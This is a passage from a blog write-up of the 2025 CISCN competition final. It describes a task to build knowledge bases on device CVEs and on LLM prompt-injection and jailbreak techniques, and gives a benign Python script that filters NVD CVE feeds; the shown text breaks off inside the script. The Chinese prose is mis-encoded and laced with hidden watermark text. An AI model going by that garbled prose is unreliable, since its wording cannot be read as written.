<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="s3ven" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <meta property="og:site_name" content="s3ven&#39;s blog">
  
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>2025 CISCN Final WriteUp | s3ven&#39;s blog</title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Font -->
  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="../../js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">s3ven's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/links/">
          <a href="/links/">Links</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="../../js/activeNav.js"></script>



      <div class="flex-container">
        
  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="../../js/codeCopy.js"></script>







  

  

  

  
  <div class="container-wider post-details" id="post-details">
    <div class="zoom-wrap">
      <div class="post-content">
        <div class="post-title">2025 CISCN Final WriteUp</div>
        <div class="post-attach">
          <span class="post-pubtime">
            <i class="iconfont icon-updatetime mr-10" title="åˆ›å»ºæ—¶é—´"></i>
            2025-07-21
          </span>
          
                <span class="post-categories">
                  <i class="iconfont icon-bookmark mr-10" title="åˆ†ç±»"></i>
                  
                  <span class="span--category">
                    <a href="../../categories/write-up/" title="Write Up">
                      Write Up
                    </a>
                  </span>
                  
                </span>
            
                <span class="post-tags">
                  <i class="iconfont icon-tags mr-10" title="æ ‡ç­¾"></i>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/java/" title="Java">
                      #Java
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/sql/" title="SQL">
                      #SQL
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/python/" title="Python">
                      #Python
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/go/" title="Go">
                      #Go
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/javascript/" title="JavaScript">
                      #JavaScript
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/apache/" title="Apache">
                      #Apache
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/ollama/" title="Ollama">
                      #Ollama
                    </a>
                  </span>
                  
                  <span class="span--tag mr-8">
                    <a href="../../tags/pentest/" title="Pentest">
                      #Pentest
                    </a>
                  </span>
                  
                </span>
            
        </div>
        <div class="markdown-body">
          
<style id="hexo-wm">
.hexo-wm {
  color: transparent !important;
  opacity: 0 !important;
  font-size: 0 !important;
  line-height: 0 !important;
  pointer-events: none !important;
  user-select: text !important;
  -webkit-user-select: text !important;
  speak: none !important;
  vertical-align: baseline !important;
  display: inline !important;
}

.hexo-wm * { color: transparent !important; opacity: 0 !important; }
</style>
<html><head></head><body><blockquote>
<p>ä»Šå¹´çš„å›½èµ›å†³èµ›ä¾æ—§æ˜¯å’Œå»å¹´ä¸€æ ·è‰è”äº†åŒå›½ä¸€ï¼Œ<span class="hexo-wm">Ñ•â€ï»¿Â³â…´enÂ·<span class="hexo-wm">Ñ•ï»¿ï»¿â‘¶ğ’—ğ˜¦ï½âˆ™ï»¿sï½‰ï»¿teâ€Œ</span>â€Œâ€‹ğ’”â…ˆâ€Œâ€‹ğ­eï»¿ï»¿</span>åŒæ—¶ä¸¤æ”¯é˜Ÿä¼éƒ½è¿›å…¥äº†å…¨å›½å‰å</p>
</blockquote>
<p><img src="image-1.png" alt="image-1.png"></p>
<h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><blockquote>
<p>Rank 8</p>
</blockquote>
<p><img src="image-2.png" alt="image-2.png"></p>
<h3 id="1-çŸ¥è¯†åº“æ„å»ºä»»åŠ¡"><a href="#1-çŸ¥è¯†åº“æ„å»ºä»»åŠ¡" class="headerlink" title="1. çŸ¥è¯†åº“æ„å»ºä»»åŠ¡"></a>1. çŸ¥è¯†åº“æ„å»ºä»»åŠ¡</h3><p>æœ¬ä»»åŠ¡æ—¨åœ¨å¼•å¯¼é€‰æ‰‹å›´ç»•ç½‘ç»œç¡¬ä»¶è®¾å¤‡ä¸å¤§æ¨¡<span class="hexo-wm">ğ’”â€‹â‘¶ğ¯ğ˜¦ï½â€¤â€Œêœ±iâ€â€ï½”â„®ï»¿â€‹</span>å‹å®‰å…¨ä¸¤ä¸ªæ–¹å‘æ„å»ºç»“æ„åŒ–çŸ¥è¯†åº“ï¼š</p>
<p>ä¸€æ–¹é¢ï¼Œèšç„¦2020å¹´èµ·Ciscoã€TP-LINKç­‰ä¸»æµç¡¬ä»¶è®¾å¤‡ä»¥åŠè½¦è”ç½‘è®¾å¤‡çš„æ¼æ´ä¿¡æ¯ï¼Œ<span class="hexo-wm">sâ€Œâ€‹Â³â…´ğnâ€¤â€sï½‰â€‹ğ­ï½…ï»¿â€‹</span>æå–CVEç¼–å·ã€æ”»å‡»å‘é‡ã€è¡¥ä¸é“¾æ¥ç­‰è¦ç´ å¹¶åˆ†ç±»æ•´ç†ï¼›</p>
<p>å¦ä¸€æ–¹é¢ï¼Œå›´ç»•ChatGPTã€<span class="hexo-wm">ğ˜€â€Œï»¿3vï½…ğ˜¯âˆ™ï»¿â€ğ˜€â…ˆâ€‹tğï»¿â€‹</span>æ–‡å¿ƒä¸€è¨€ç­‰å¤§æ¨¡å‹ï¼Œç³»ç»Ÿæ¢³ç†2023å¹´èµ·å…¬å¼€çš„æç¤ºæ³¨å…¥ã€è¶Šç‹±ç­‰æ”»å‡»æŠ€æœ¯ä¸é˜²å¾¡æ–¹æ¡ˆã€‚</p>
<h4 id="1-1-ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´"><a href="#1-1-ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´" class="headerlink" title="1.1 ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´"></a>1.1 ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´</h4><p>ç½‘ç»œç¡¬ä»¶è®¾å¤‡æ¼æ´å†…å®¹å¿…é¡»åŒ…å«ä»¥ä¸‹è¦ç´ ï¼šåºå·ã€è®¾å¤‡å“ç‰Œã€è®¾å¤‡ç±»å‹ã€äº§å“å‹å·ã€CVEç¼–å·ã€æ¼æ´æè¿°ã€<span class="hexo-wm">ğ’”â€Œâ€3ğ¯ğğ’.â€Œï»¿ğ’”iï»¿â€Œï½”eï»¿</span>æ”»å‡»å‘é‡ã€å‚å•†è¡¥ä¸é“¾æ¥ã€å—å½±å“ç‰ˆæœ¬ã€å…¬å¼€æ—¥æœŸ</p>
<p><strong>æ³¨æ„</strong>ï¼šè®¾å¤‡ç±»å‹ä¸ºè·¯ç”±å™¨ã€äº¤æ¢æœºã€<span class="hexo-wm">ğ˜€â€ï»¿â‘¶vğğ§â€¤â€sâ…ˆâ€â€Œğ’•ğâ€‹</span>é˜²ç«å¢™ã€IDSã€IPSä¹‹ç±»çš„è®¾å¤‡å“ç‰Œï¼Œæ”¶é›†èŒƒå›´<strong>åŒ…å«ä½†ä¸é™äº</strong>Ciscoã€TP-LINKã€NETGEARã€ASUSã€D-Linkï¼›è®¾å¤‡ç±»å‹ä¸ºè½¦è½½é€šä¿¡ç½‘å…³ã€è½¦è½½ä¿¡æ¯å¨±ä¹ç³»ç»Ÿã€V2Xé€šä¿¡æ¨¡å—ã€OTAå‡çº§æ¨¡å—ã€FOTAç®¡ç†æ¨¡å—ã€CANæ€»çº¿æ§åˆ¶å™¨ç­‰è½¦è”ç½‘ç›¸å…³è®¾å¤‡çš„å“ç‰Œä¸åšé™åˆ¶ã€‚</p>
<p>å¯¹äºç¬¬ä¸€éƒ¨åˆ†ï¼Œä» <a href="https://nvd.nist.gov/vuln/data-feeds">NVD Data<span class="hexo-wm">êœ±â€3vğğ§âˆ™â€êœ±ï½‰ï»¿teâ€ï»¿</span> Feeds</a> ä¸­ä¸‹è½½ 2020-2025 å¹´çš„ Json æ ¼å¼çš„æ‰€æœ‰CVEæ¼æ´æ•°æ®åº“ï¼Œå¹¶ç¼–å†™è„šæœ¬ç­›é€‰ç¬¦åˆè¦æ±‚çš„æ¼æ´ä¿¡æ¯å†™å…¥ xlsx è¡¨æ ¼ä¸­ï¼Œå¯¹äºä¿¡æ¯æºä¸­çš„ Json æ•°æ®ï¼Œä¼˜å…ˆä½¿ç”¨ CPE æ ‡è¯†è¿›è¡ŒåŒ¹é…å’Œè§£æï¼Œå¦‚æœä¸å­˜åœ¨ CPE æ ‡è¯†ï¼Œåˆ™ FallBack åˆ° description åŒ¹é…å’Œè§£æï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gzip<span class="token punctuation">,</span> ijson
<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm

DATA_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>
YEARS <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2020</span><span class="token punctuation">,</span> <span class="token number">2026</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">iter_cpes</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> node<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cpe_match"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> c
    <span class="token keyword">for</span> child <span class="token keyword">in</span> node<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"children"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> <span class="token keyword">from</span> iter_cpes<span class="token punctuation">(</span>child<span class="token punctuation">)</span>

<span class="token comment"># ç½‘ç»œè®¾å¤‡å“ç‰Œ</span>
VENDORS <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"cisco"</span><span class="token punctuation">,</span><span class="token string">"tp-link"</span><span class="token punctuation">,</span><span class="token string">"tplink"</span><span class="token punctuation">,</span><span class="token string">"netgear"</span><span class="token punctuation">,</span><span class="token string">"asus"</span><span class="token punctuation">,</span><span class="token string">"d-link"</span><span class="token punctuation">,</span>
    <span class="token string">"huawei"</span><span class="token punctuation">,</span><span class="token string">"dell"</span><span class="token punctuation">,</span><span class="token string">"broadcom"</span><span class="token punctuation">,</span><span class="token string">"tesla"</span><span class="token punctuation">,</span><span class="token string">"continental"</span><span class="token punctuation">,</span>
    <span class="token string">"bosch"</span><span class="token punctuation">,</span><span class="token string">"panasonic"</span><span class="token punctuation">,</span><span class="token string">"hp"</span>
<span class="token punctuation">}</span>

<span class="token comment"># ç½‘ç»œè®¾å¤‡ç±»å‹</span>
KEYWORDS1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"router"</span><span class="token punctuation">:</span><span class="token string">"è·¯ç”±å™¨"</span><span class="token punctuation">,</span><span class="token string">"switch"</span><span class="token punctuation">:</span><span class="token string">"äº¤æ¢æœº"</span><span class="token punctuation">,</span><span class="token string">"firewall"</span><span class="token punctuation">:</span><span class="token string">"é˜²ç«å¢™"</span><span class="token punctuation">,</span>
    <span class="token string">"ids"</span><span class="token punctuation">:</span><span class="token string">"IDS"</span><span class="token punctuation">,</span><span class="token string">"ips"</span><span class="token punctuation">:</span><span class="token string">"IPS"</span>
<span class="token punctuation">}</span>

<span class="token comment"># è½¦è”ç½‘è®¾å¤‡ç±»å‹</span>
KEYWORDS2 <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"gateway"</span><span class="token punctuation">:</span><span class="token string">"è½¦è½½é€šä¿¡ç½‘å…³"</span><span class="token punctuation">,</span><span class="token string">"infotainment"</span><span class="token punctuation">:</span><span class="token string">"ä¿¡æ¯å¨±ä¹ç³»ç»Ÿ"</span><span class="token punctuation">,</span>
    <span class="token string">"v2x"</span><span class="token punctuation">:</span><span class="token string">"V2Xé€šä¿¡æ¨¡å—"</span><span class="token punctuation">,</span><span class="token string">"ota"</span><span class="token punctuation">:</span><span class="token string">"OTAå‡çº§æ¨¡å—"</span><span class="token punctuation">,</span>
    <span class="token string">"fota"</span><span class="token punctuation">:</span><span class="token string">"FOTAç®¡ç†æ¨¡å—"</span><span class="token punctuation">,</span><span class="token string">"can"</span><span class="token punctuation">:</span><span class="token string">"CANæ€»çº¿æ§åˆ¶å™¨"</span>
<span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">match_uri</span><span class="token punctuation">(</span>uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    low <span class="token operator">=</span> uri<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token builtin">any</span><span class="token punctuation">(</span>v <span class="token keyword">in</span> low <span class="token keyword">for</span> v <span class="token keyword">in</span> VENDORS<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">any</span><span class="token punctuation">(</span>k <span class="token keyword">in</span> low <span class="token keyword">for</span> k <span class="token keyword">in</span> KEYWORDS1<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">or</span> <span class="token builtin">any</span><span class="token punctuation">(</span>k <span class="token keyword">in</span> low <span class="token keyword">for</span> k <span class="token keyword">in</span> KEYWORDS2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">match_description</span><span class="token punctuation">(</span>desc<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    low <span class="token operator">=</span> desc<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token punctuation">(</span><span class="token builtin">any</span><span class="token punctuation">(</span>v <span class="token keyword">in</span> low <span class="token keyword">for</span> v <span class="token keyword">in</span> VENDORS<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">any</span><span class="token punctuation">(</span>k <span class="token keyword">in</span> low <span class="token keyword">for</span> k <span class="token keyword">in</span> KEYWORDS1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dtype_from_uri</span><span class="token punctuation">(</span>uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    low <span class="token operator">=</span> uri<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> zh <span class="token keyword">in</span> KEYWORDS1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> k <span class="token keyword">in</span> low<span class="token punctuation">:</span>
            <span class="token keyword">return</span> zh
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> zh <span class="token keyword">in</span> KEYWORDS2<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> k <span class="token keyword">in</span> low<span class="token punctuation">:</span>
            <span class="token keyword">return</span> zh
    <span class="token keyword">return</span> <span class="token string">"å…¶ä»–ç½‘ç»œè®¾å¤‡"</span>

<span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>item<span class="token punctuation">:</span> <span class="token builtin">dict</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
    meta <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"CVE_data_meta"</span><span class="token punctuation">]</span>
    cve  <span class="token operator">=</span> meta<span class="token punctuation">[</span><span class="token string">"ID"</span><span class="token punctuation">]</span>
    desc <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description_data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span>
    pub  <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"publishedDate"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    av   <span class="token operator">=</span> item<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"impact"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"baseMetricV3"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cvssV3"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"attackVector"</span><span class="token punctuation">,</span> <span class="token string">"N/A"</span><span class="token punctuation">)</span>

    brand <span class="token operator">=</span> model <span class="token operator">=</span> <span class="token string">"æœªçŸ¥"</span>
    dtype <span class="token operator">=</span> <span class="token string">"å…¶ä»–ç½‘ç»œè®¾å¤‡"</span>
    versions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> node <span class="token keyword">in</span> item<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"configurations"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"nodes"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> cpe <span class="token keyword">in</span> iter_cpes<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">:</span>
            uri <span class="token operator">=</span> cpe<span class="token punctuation">[</span><span class="token string">"cpe23Uri"</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> match_uri<span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            parts <span class="token operator">=</span> uri<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parts<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">6</span><span class="token punctuation">:</span>
                brand <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">or</span> brand
                model <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">or</span> model
            dtype <span class="token operator">=</span> dtype_from_uri<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>

            v <span class="token operator">=</span> <span class="token punctuation">(</span>cpe<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"versionEndIncluding"</span><span class="token punctuation">)</span>
                 <span class="token keyword">or</span> cpe<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"versionStartIncluding"</span><span class="token punctuation">)</span>
                 <span class="token keyword">or</span> cpe<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> v <span class="token keyword">and</span> v <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                versions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v<span class="token punctuation">)</span>

    <span class="token keyword">if</span> brand <span class="token operator">==</span> <span class="token string">"æœªçŸ¥"</span><span class="token punctuation">:</span>
        low_desc <span class="token operator">=</span> desc<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> v <span class="token keyword">in</span> VENDORS<span class="token punctuation">:</span>
            <span class="token keyword">if</span> v <span class="token keyword">in</span> low_desc<span class="token punctuation">:</span>
                brand <span class="token operator">=</span> v
                <span class="token keyword">break</span>

    <span class="token keyword">if</span> dtype <span class="token operator">==</span> <span class="token string">"å…¶ä»–ç½‘ç»œè®¾å¤‡"</span><span class="token punctuation">:</span>
        low_desc <span class="token operator">=</span> desc<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> k<span class="token punctuation">,</span> zh <span class="token keyword">in</span> KEYWORDS1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> k <span class="token keyword">in</span> low_desc<span class="token punctuation">:</span>
                dtype <span class="token operator">=</span> zh
                <span class="token keyword">break</span>

    patch <span class="token operator">=</span> <span class="token string">"æ— å¯ç”¨é“¾æ¥"</span>
    <span class="token keyword">for</span> ref <span class="token keyword">in</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"reference_data"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> ref<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> brand <span class="token operator">!=</span> <span class="token string">"æœªçŸ¥"</span> <span class="token keyword">and</span> brand<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            patch <span class="token operator">=</span> url
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"reference_data"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            patch <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"references"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"reference_data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>

    <span class="token keyword">return</span> <span class="token punctuation">{</span>
        <span class="token string">"è®¾å¤‡å“ç‰Œ"</span><span class="token punctuation">:</span> brand<span class="token punctuation">,</span>
        <span class="token string">"è®¾å¤‡ç±»å‹"</span><span class="token punctuation">:</span> dtype<span class="token punctuation">,</span>
        <span class="token string">"äº§å“å‹å·"</span><span class="token punctuation">:</span> model<span class="token punctuation">,</span>
        <span class="token string">"CVEç¼–å·"</span><span class="token punctuation">:</span>  cve<span class="token punctuation">,</span>
        <span class="token string">"æ¼æ´æè¿°"</span><span class="token punctuation">:</span> desc<span class="token punctuation">,</span>
        <span class="token string">"æ”»å‡»å‘é‡"</span><span class="token punctuation">:</span> av<span class="token punctuation">,</span>
        <span class="token string">"å‚å•†è¡¥ä¸é“¾æ¥"</span><span class="token punctuation">:</span> patch<span class="token punctuation">,</span>
        <span class="token string">"å—å½±å“ç‰ˆæœ¬"</span><span class="token punctuation">:</span> <span class="token string">"; "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>versions<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> versions <span class="token keyword">else</span> <span class="token string">"æ‰€æœ‰ç‰ˆæœ¬æˆ–è¯¦è§å…¬å‘Š"</span><span class="token punctuation">,</span>
        <span class="token string">"å…¬å¼€æ—¥æœŸ"</span><span class="token punctuation">:</span>  pub<span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    rows<span class="token punctuation">,</span> seen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> year <span class="token keyword">in</span> YEARS<span class="token punctuation">:</span>
        feed <span class="token operator">=</span> DATA_DIR <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"nvdcve-1.1-</span><span class="token interpolation"><span class="token punctuation">{</span>year<span class="token punctuation">}</span></span><span class="token string">.json.gz"</span></span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> feed<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> FileNotFoundError<span class="token punctuation">(</span>feed<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"è§£æ </span><span class="token interpolation"><span class="token punctuation">{</span>year<span class="token punctuation">}</span></span><span class="token string"> ä¸­"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>feed<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fh<span class="token punctuation">:</span>
            <span class="token keyword">for</span> item <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>ijson<span class="token punctuation">.</span>items<span class="token punctuation">(</span>fh<span class="token punctuation">,</span> <span class="token string">"CVE_Items.item"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> desc<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">"CVE"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment"># cpe åŒ¹é…å’Œè§£æ</span>
                cpe_match <span class="token operator">=</span> <span class="token builtin">any</span><span class="token punctuation">(</span>
                    match_uri<span class="token punctuation">(</span>cpe<span class="token punctuation">[</span><span class="token string">"cpe23Uri"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
